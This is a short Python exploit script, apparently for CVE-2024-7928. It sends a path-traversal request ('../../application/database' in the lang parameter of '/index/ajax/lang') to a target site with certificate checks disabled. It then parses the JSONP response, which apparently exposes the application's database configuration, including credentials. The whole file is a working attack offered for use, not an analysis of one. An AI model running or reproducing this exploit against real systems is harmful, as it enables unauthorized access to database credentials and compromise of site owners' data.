import requests
import os
import json
import xml.etree.ElementTree as ET
import random
from typing import Union, Dict


class CVE_2024_7928:
    def __init__(
            self, url: str, path: str = "/index/ajax/lang", key: str = "lang", value: str = "../../application/database"
    ) -> None:
        self.url = url.rstrip("/")
        self.check_path = f"{path}?{key}={value}"

    def check_vuln(self) -> Union[Dict[str, str], None]:
        full_url = f"{self.url}{self.check_path}"
        response_body = self.make_request(full_url)

        if response_body and 'jsonpReturn(' in response_body:
            json_str = response_body.split('jsonpReturn(')[1].split(');')[0]
            return self.parse_json(json_str)

        return None

    @staticmethod
    def make_request(url: str) -> Union[str, None]:
        try:
            response = requests.get(url, verify=False)
            if response.status_code == 200:
                return response.text
        except requests.RequestException:
            return None

    @staticmethod
    def parse_json(json_str: str) -> Dict[str, str]:
        try:
            return json.loads(json_str)
        except json.JSONDecodeError:
            raise
